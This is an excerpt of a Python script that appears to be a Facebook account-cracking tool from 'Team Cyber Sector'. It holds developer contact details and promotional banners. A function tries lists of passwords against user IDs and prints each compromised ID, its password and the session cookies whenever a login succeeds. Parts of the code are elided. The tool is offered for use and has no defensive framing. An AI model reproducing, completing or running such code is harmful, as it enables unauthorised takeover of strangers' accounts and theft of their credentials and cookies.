...
number=int("+8801617084346")

devoloper_info={
    "Developer" :  'Sujon Bevies',
    "Status" :  '24-ONLINE',
    "GitHub":  'sujonbevies',
    "Facebook" :  'https://www.facebook.com/sujonbevies',
    }
...
note1="""- Follow My Facebook ID`\n- Try tool and **Review**"""
n1=Markdown(note1)

note2="""#  Team CS-Cyber Sector__\n- Choice BD code \n- And Put Limit"""
n2=Markdown(note2)
...
def main():
    ...
    space()
    #dual("Hello bro,I am Sujon,I am CEO Of Team Cyber Sector,and welcome to our tool","y.mp3")
...
def need(uid,pwx,fb,tl):
    ...
    sys.stdout.write(f"\r  \33[1;90m[\33[1;97m[SUJONðŸ˜ˆOK]\33[1;92m | {'{:.1%}'.format(loop/int(tl))} | \33[1;97m{loop} \33[1;90m] \r "),
    sys.stdout.flush()
    try:
        for ps in pwx:
            ...
            if "c_user" in heron_brand:
                ...
                xd=xx[:15]
                print("\r\r\n\n")
                print(Panel(f"\r\r\n[white reverse][ðŸ˜ˆ]=UID/PAS[/white reverse] [bold green]{xd} [cyan]â€¢ [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[ðŸ”¶][/yellow reverse][bold green]{coki}\n",title=f"[red reverse][TOTAL-OK {hh}]"))
                #print(f"\r\r\n[white reverse][ðŸ˜ˆ]=UID/PAS[/white reverse] [bold green]{xd} [cyan]â€¢ [black reverse]{ps}[/black reverse] \n[yellow reverse]COOKIES=[ðŸ”¶][/yellow reverse][bold green]{coki}\n")
